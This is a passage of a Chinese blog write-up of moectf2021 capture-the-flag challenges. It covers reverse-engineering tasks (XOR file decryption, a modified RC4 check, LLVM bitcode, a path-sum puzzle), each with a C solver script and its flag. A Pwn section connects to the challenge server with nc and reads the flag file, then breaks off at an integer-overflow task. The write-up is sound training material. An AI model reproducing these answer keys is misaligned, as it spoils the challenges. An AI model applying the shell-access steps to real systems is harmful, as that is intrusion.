[ebp-14h]</span></span><br><span class="line">  FILE *v6; <span class="comment">// [esp+20h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+24h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+28h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+2Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="comment">// logo 就不输出了</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[root@Track.Sh]# Welcome to moectf2021! It&#x27;s just a mirror flower moon~&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input);</span><br><span class="line">  v7 = <span class="built_in">strlen</span>(input);</span><br><span class="line">  v6 = fopen(<span class="string">&quot;file_org&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    fseek(v6, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">    v5 = ftell(v6);</span><br><span class="line">    rewind(v6);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5 - <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      bank[i] = getc(v6);</span><br><span class="line">      bank[i] = ~(bank[i] ^ input[i % v7]);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v6);</span><br><span class="line">    v4 = fopen(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v5; ++j )</span><br><span class="line">      fputc((<span class="keyword">int</span>)v4, (FILE *)bank[j]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[root@Track.Sh]# It&#x27;s over, I don&#x27;t know what you gonna do but... Just keep justy.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[root@Track.Sh]# An unexcepted error happened:(&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然不知道之前输入了什么, 我们还是尝试解密一下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;rb&quot;</span>), *g = fopen(<span class="string">&quot;out&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fseek(f, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> len = ftell(f), i;</span><br><span class="line">    rewind(f);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        putc(~getc(f), g);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f); fclose(g);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用记事本打开输出文件, 解密了, 但是, 没有完全解密.<br>记事本中有这么一段:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">??鎒qiersill摉ke羙u!reve2ierwilllikeyou!reverierwilllikeyou!騟ve|v遼w輊</span><br></pre></td></tr></table></figure><p>原来PE文件有很多相连的0字符, 这些地方异或以后会出现循环的密码字串, 盲猜一手密码是reverierwilllikeyou! 稍微修改下代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> code[<span class="number">128</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, code);</span><br><span class="line">    <span class="keyword">size_t</span> sl = <span class="built_in">strlen</span>(code);</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;rb&quot;</span>), *g = fopen(<span class="string">&quot;out&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    fseek(f, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> len = ftell(f), i;</span><br><span class="line">    rewind(f);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        putc((~getc(f) ^ code[i % sl]), g);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f); fclose(g);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入那个密码, 再用记事本打开, 看到了久违的MZ头.<br>修改后缀为exe, 得到flag.</p><blockquote><p>moectf{P3_Structur3_1s_r3ally_fUnnY!}</p></blockquote><h3 id="RedC4Bomb"><a href="#RedC4Bomb" class="headerlink" title="RedC4Bomb"></a>RedC4Bomb</h3><p>打开分析, 发现main函数直接JUMPOUT, 切汇编看看发生甚么事了.<br>找到JUMPOUT的地方, 发现加了花指令, 填nop还原一下. 诶, 又有一个, 再还原…<br>搞了老半天, 可能有什么脚本能快一点吧, IDA更多的不懂了.<br>总之有两个函数加了花指令, 都还原以后, 查看程序逻辑(有些函数名已修改):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main_0</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-1E8h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+0h] [ebp-1E8h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+0h] [ebp-1E8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+D0h] [ebp-118h]</span></span><br><span class="line">  <span class="keyword">int</span> v8[<span class="number">66</span>]; <span class="comment">// [esp+DCh] [ebp-10Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Welcome to moectf2021!\n&quot;</span>, v4);</span><br><span class="line">  sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Input your flag to dismantle the bomb: &quot;</span>, v5);</span><br><span class="line">  RC_JunkF();                                   <span class="comment">// 垃圾代码</span></span><br><span class="line">  sub_41403C(<span class="string">&quot;%s&quot;</span>, (<span class="keyword">char</span>)&amp;unk_43D138);</span><br><span class="line">  RC_JunkF();</span><br><span class="line">  RC_Zero(v8, <span class="number">0x104</span>u);</span><br><span class="line">  RC_SetCode(v8);</span><br><span class="line">  RC_JunkF();</span><br><span class="line">  RC_InitBox((<span class="keyword">char</span> *)v8[<span class="number">64</span>], (<span class="keyword">int</span>)v8);</span><br><span class="line">  RC_Encoding((<span class="keyword">int</span>)v8, (<span class="keyword">int</span>)&amp;unk_43D138, (<span class="keyword">int</span>)byte_43D520);</span><br><span class="line">  RC_JunkF();</span><br><span class="line">  <span class="keyword">if</span> ( sub_4143DE((<span class="keyword">int</span>)&amp;unk_43D138) == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    RC_JunkF();</span><br><span class="line">    RC_JunkF();</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( byte_43D520[i] != byte_43AB30[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_4140E1(<span class="string">&quot;[root@Track.Sh]# NoNoNo! The bomb will go off!\n&quot;</span>, v6);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RC_JunkF();</span><br><span class="line">    sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Right! The bomb was successfully disassembled~\n&quot;</span>, v6);</span><br><span class="line">    sub_4140E1(<span class="string">&quot;[root@Track.Sh]# The flag is moectf&#123;%s&#125;\n&quot;</span>, (<span class="keyword">char</span>)&amp;unk_43D138);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    sub_4140E1(<span class="string">&quot;[root@Track.Sh]# Wrong length! The bomb will go off!\n&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较像RC4, 但不完全是, 我用THISISAFAKEFLAG作为密码试了一下, 发现不行.<br>v8应该是一个C++类, 前256字节放sbox, 紧跟着是密码字符串, 先初始化sbox, 再加密用户输入, 然后和byte_43AB30比对.</p><p>碰一下运气吧, 猜它是对称加密, 写了如下代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint8_t</span> u8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4</span><span class="params">(<span class="keyword">const</span> u8 *in, u8 *out, <span class="keyword">size_t</span> len, <span class="keyword">const</span> u8 *key, <span class="keyword">size_t</span> keylen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    u8 S[<span class="number">256</span>], T[<span class="number">256</span>], b, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        S[i] = i;</span><br><span class="line">        T[i] = (u8)key[i % keylen];</span><br><span class="line">    &#125;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        j = (j + S[i] + T[i]) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        b = S[i]; S[i] = S[j]; S[j] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    j = k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        j++; k = k + S[j];</span><br><span class="line">        b = S[j]; S[j] = S[k]; S[k] = b;</span><br><span class="line">        out[i] = in[i] ^ S[(u8)(S[j] + S[k])];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc4f</span><span class="params">(<span class="keyword">const</span> u8 *in, u8 *out, <span class="keyword">size_t</span> len, <span class="keyword">const</span> u8 *key, <span class="keyword">size_t</span> keylen)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    u8 S[<span class="number">256</span>], T[<span class="number">256</span>], b, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        S[i] = <span class="number">0</span>;</span><br><span class="line">        T[i] = (u8)key[i % keylen];</span><br><span class="line">    &#125;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">        S[i] = <span class="number">-1</span> - i;</span><br><span class="line">        j = (j + S[i] + T[i]) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        b = S[i]; S[i] = S[j]; S[j] = b;</span><br><span class="line">    &#125;</span><br><span class="line">    j = k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">        j++; k = k + S[j];</span><br><span class="line">        b = S[j]; S[j] = S[k]; S[k] = b;</span><br><span class="line">        out[i] = in[i] ^ S[(u8)(S[j] + S[k])];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> key[] = <span class="string">&quot;THISISAFAKEFLAG&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> u8 m[] = &#123;</span><br><span class="line">    <span class="number">0x44</span>, <span class="number">0x3F</span>, <span class="number">0x53</span>, <span class="number">0x2F</span>, <span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0x3E</span>, <span class="number">0xAE</span>, <span class="number">0x55</span>, <span class="number">0xBE</span>,</span><br><span class="line">    <span class="number">0x18</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x33</span>,</span><br><span class="line">    <span class="number">0x5F</span>, <span class="number">0xF2</span>, <span class="number">0x06</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    u8 buf[<span class="number">21</span>];</span><br><span class="line">    buf[<span class="number">20</span>] = <span class="number">0</span>;</span><br><span class="line">    rc4f(m, buf, <span class="number">20</span>, (<span class="keyword">const</span> u8 *)key, <span class="built_in">strlen</span>(key));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下, 得到”D1S4ss3mbl3_th3_b0mb”, 这应该就是我们要的答案了, 试一下, 果然可以.</p><blockquote><p>moectf{D1S4ss3mbl3_th3_b0mb}</p></blockquote><h3 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h3><p>这 都 是 些 啥 啊<br>我不到啊! 像某种汇编指令, 注意到文件中出现了这些东西:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">llvm.module.flags</span><br><span class="line">clang version 6.0.0-1ubuntu2</span><br></pre></td></tr></table></figure><p>在网上查询得知, 这是llvm的代码, 由clang编译得来. 这个原来的后缀应该是.ll, 从SegmentFault网上找到了编译它的方法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">llvm-as chall.ll</span><br><span class="line">llc chall.bc</span><br><span class="line">clang chall.s</span><br></pre></td></tr></table></figure><p>结果找不到<code>__isoc99_scanf</code>. 额, 强行换成<code>scanf</code>, 这下可以了.<br>IDA载入, 那两个显眼的<del>下北沢</del>函数是RC4. 下面那个像base64(不完全是). 先把比对结果转成base64:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> key[] = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">int</span> n = <span class="built_in">strlen</span>(buf), i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        buf[i] = key[buf[i] - <span class="number">61</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用工具进行base64解码, 再用程序中的”11 45 14 61 76 61 6C 6F 6E 2C 79 79 64 73”作为密钥进行RC4, 得到答案.</p><blockquote><p>moectf{Y0u_Kn0w_1lVm_ir_c0d3_A_l0t_!1!1}</p></blockquote><h3 id="Algorithm-revenge"><a href="#Algorithm-revenge" class="headerlink" title="Algorithm_revenge"></a>Algorithm_revenge</h3><p>又是个算法题. 载入后发现程序用一个固定的种子向一个二维数组填入随机数. 程序意图为:</p><blockquote><p>小人从(1, 1)出发, 可以选择(2, 1)或(2, 2)<br>小人在(n, m)时, 可以在下一步跳到(n + 1, m + i), (i = -1, 0, 1 且 m + i &gt; 0).<br>直到 n = 50 时停止. 计算小人经过的数的总和. 求和的最大值.</p></blockquote><p>我的算法是倒推法, 简单说就是从第 n 层去选一个 n + 1 层中最好的结果.如图所示:</p><p><img src="/pictures/moectf_algorithm_demo.svg" alt="算法"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">map</span>[<span class="number">2499</span>], tree[<span class="number">2499</span>], path[<span class="number">49</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_buffer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j; srand(<span class="number">0x1BF52</span>u);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">50</span>; i++) <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++) <span class="built_in">map</span>[<span class="number">50</span> * i + j] = rand() % <span class="number">1919810</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k, m, n, s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">48</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt;= i; j++)&#123;</span><br><span class="line">            <span class="keyword">int</span> l = j - <span class="number">1</span>, r = j + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (l &lt; <span class="number">0</span>) l = <span class="number">0</span>;</span><br><span class="line">            m = INT_MIN;</span><br><span class="line">            s = <span class="built_in">map</span>[<span class="number">50</span> * i + j];</span><br><span class="line">            <span class="keyword">for</span> (k = l; k &lt;= r; k++)&#123;</span><br><span class="line">                n = <span class="built_in">map</span>[<span class="number">50</span> * (i + <span class="number">1</span>) + k];</span><br><span class="line">                <span class="keyword">if</span> (n &gt; m)&#123;</span><br><span class="line">                    m = n;</span><br><span class="line">                    <span class="built_in">map</span>[<span class="number">50</span> * i + j] = m + s;</span><br><span class="line">                    tree[<span class="number">50</span> * i + j] = k - j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> tab[] = &#123;<span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;R&#x27;</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disp</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>, s;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">49</span>; i++)&#123;</span><br><span class="line">        s = tree[i * <span class="number">50</span> + p];</span><br><span class="line">        <span class="built_in">putchar</span>(tab[s + <span class="number">1</span>]);</span><br><span class="line">        p += s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    init_buffer();</span><br><span class="line">    solve();</span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;moectf&#123;&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">    disp();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真就acm了呗.</p><blockquote><p>moectf{DDDRDDLRLRDRDRLLRRRDLLLRRLDRRDRRLDDDLDRRDLRDLLRDD}</p></blockquote><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>之前打比赛的时候完全不知道题目什么意思, 网站打开是一个个人博客, 然后啥也没有啊?<br>比赛结束才想起去网上搜一搜nc是啥, 然后发现是一个命令, 安装了个amd64的linux试了一下, 诶可以了.</p><h3 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h3><p>linux下输入<code>nc pwn.blackbird.wang 9500</code>, 然后<code>cat flag</code></p><blockquote><p>moectf{enjoy_the_netcat_and_the_shell}</p></blockquote><h3 id="Int-overflow"><a href="#Int-overflow" class="headerlink" title="Int_overflow"></a>Int_overflow</h3><p>IDA打开分析:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you no integer overflow?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input an int ( &lt;0 )&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, 